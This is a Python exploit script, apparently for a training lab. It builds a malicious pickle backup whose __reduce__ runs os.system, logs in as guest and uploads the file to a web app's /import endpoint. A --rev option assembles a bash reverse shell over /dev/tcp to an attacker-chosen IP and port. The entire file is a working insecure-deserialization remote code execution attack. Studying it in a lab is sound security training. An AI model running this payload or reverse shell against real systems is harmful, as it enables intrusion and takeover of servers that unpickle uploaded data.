#!/usr/bin/env python3
"""Create and upload the lab's intentionally malicious pickle backup."""

import argparse
import base64
import pickle

import requests


class Exploit:
    def __init__(self, command):
        self.command = command

    def __reduce__(self):
        import os

        return (os.system, (self.command,))


def build_payload(command):
    return base64.b64encode(pickle.dumps(Exploit(command)))


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--url", default="http://127.0.0.1:9000", help="lab base URL")
    parser.add_argument("--cmd", help="command to execute in the container")
    parser.add_argument("--rev", help="reverse shell target in IP:PORT form")
    args = parser.parse_args()

    if args.rev and args.cmd:
        parser.error("choose either --cmd or --rev")
    if args.rev:
        try:
            ip, port = args.rev.rsplit(":", 1)
            int(port)
        except ValueError as error:
            parser.error(f"--rev must be IP:PORT ({error})")
        command = f"bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'"
    else:
        command = args.cmd or "id"

    base_url = args.url.rstrip("/")
    session = requests.Session()
    print("[*] Logging in...")
    login = session.post(
        f"{base_url}/login",
        data={"username": "guest", "password": "guest"},
        timeout=5,
    )
    login.raise_for_status()

    print("[*] Sending payload...")
    response = session.post(
        f"{base_url}/import",
        files={"session_file": ("evil.bak", build_payload(command))},
        timeout=5,
    )
    response.raise_for_status()
    print("[+] Payload sent")


if __name__ == "__main__":
    main()
